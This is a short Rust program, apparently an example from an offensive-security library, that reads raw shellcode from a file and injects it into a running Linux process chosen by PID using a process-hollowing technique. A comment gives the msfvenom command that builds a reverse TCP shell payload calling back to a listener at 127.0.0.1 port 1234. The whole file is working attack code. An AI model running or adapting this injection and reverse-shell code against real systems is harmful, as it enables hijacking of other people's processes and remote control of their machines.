use std::env::{args, current_dir};

use linc::payload::{Inject, Payload};
use linc::techniques::inject::hollow;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();
    let pid: i32 = args()
        .nth(1)
        .expect("PID argument required")
        .parse()
        .expect("PID must be a number");

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode = format!("{}/assets/shellcode.bin", cwd);

    // Change target PID
    let payload = Payload::<Inject>::from_file(&shellcode, pid);

    let payload = match payload {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to create payload: {:?}", e);
            return;
        }
    };

    if let Err(e) = hollow(payload) {
        eprintln!("An error occurred: {:?}", e);
    }
}
